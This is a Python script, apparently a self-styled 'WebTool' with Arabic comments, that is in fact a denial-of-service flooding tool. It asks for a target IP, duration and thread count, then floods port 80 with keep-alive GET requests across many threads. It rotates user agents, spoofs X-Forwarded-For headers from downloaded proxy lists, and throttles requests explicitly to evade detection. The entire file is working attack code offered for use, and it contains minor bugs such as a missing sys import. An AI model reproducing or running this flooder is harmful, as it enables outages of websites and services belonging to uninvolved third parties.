import subprocess


required_packages = ["socket", "time", "random", "threading", "json", "requests", "concurrent.futures"]

# محاولة تثبيت المكتبات
for package in required_packages:
    try:
        __import__(package)  # التحقق مما إذا كانت المكتبة مثبتة
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", package])  # تثبيت المكتبة إذا لم تكن مثبتة





import socket
import time
import random
import threading
import json
from colorama import Fore, init
import requests
from sys import argv
from threading import Thread
from concurrent.futures import ThreadPoolExecutor  # لإضافة دعم Multi-threading المتقدم
init(autoreset=True)
class Color:
    LB = Fore.LIGHTBLUE_EX
    LC = Fore.LIGHTCYAN_EX
    LG = Fore.LIGHTGREEN_EX
    LR = Fore.LIGHTRED_EX
    LY = Fore.LIGHTYELLOW_EX
    RESET = Fore.RESET



print(Color.LG + """
/-----------------------------------------------------//
|              WebTool Tool-Rex.                        |
|                      By Made TheRex                |
|____________________________________________________|

""")


USER_AGENT_API = "https://raw.githubusercontent.com/sebbekarlsson/user-agents.txt/refs/heads/master/user-agents.txt"

def get_user_agents():
    try:
        response = requests.get(USER_AGENT_API, timeout=10)
        if response.status_code == 200:
            return response.text.splitlines()  # تقسيم الـ response إلى سطور
    except requests.exceptions.RequestException:
        pass  # في حال فشل الطلب، ستُستخدم القائمة الافتراضية
    return UAlist()  # العودة إلى القائمة الافتراضية إذا فشلنا في جلب البيانات من API

# القائمة الافتراضية في حالة عدم توفر اتصال بالإنترنت
def UAlist():
    return [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
        "AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "bbos",
        "urmom",
        "xd",
        "null"
    ]

def ProxyList():
    proxies = []
    try:
        with open("url.json", "r") as file:
            data = json.load(file)
            for proxy_source in data["Proxies"]:
                try:
                    response = requests.get(proxy_source["url"], timeout=proxy_source["timeout"])
                    if response.status_code == 200:
                        proxies += response.text.split("\n")
                except:
                    continue
    except:
        pass
    return list(filter(None, proxies))  # إزالة القيم الفارغة

def http(ip, floodtime):
    proxies = ProxyList()
    while time.time() < floodtime:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect((ip, 80))
                while time.time() < floodtime:
                    proxy = random.choice(proxies) if proxies else None
                    user_agent = random.choice(get_user_agents())  # استخدام الـ User Agents من الـ API أو القائمة الافتراضية
                    headers = f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\n'
                    if proxy:
                        headers += f'X-Forwarded-For: {proxy}\r\n'
                    headers += 'Connection: keep-alive\r\n\r\n'
                    sock.send(headers.encode())
                    time.sleep(0.1)  # إضافة Rate Limiting لتجنب الكشف السريع
            except:
                sock.close()

def start_attack():
    ip = input("[The] IP :> ")
    floodtime = int(input("[The] Time :> "))
    num_threads = int(input("[ohmen] :> "))

    print("\033[92mDone Started Attack TheRex\033[0m")

    with ThreadPoolExecutor(max_workers=num_threads) as executor:  # استخدام ThreadPoolExecutor لإدارة الثريدات
        for _ in range(num_threads):
            executor.submit(http, ip, time.time() + floodtime)

start_attack()
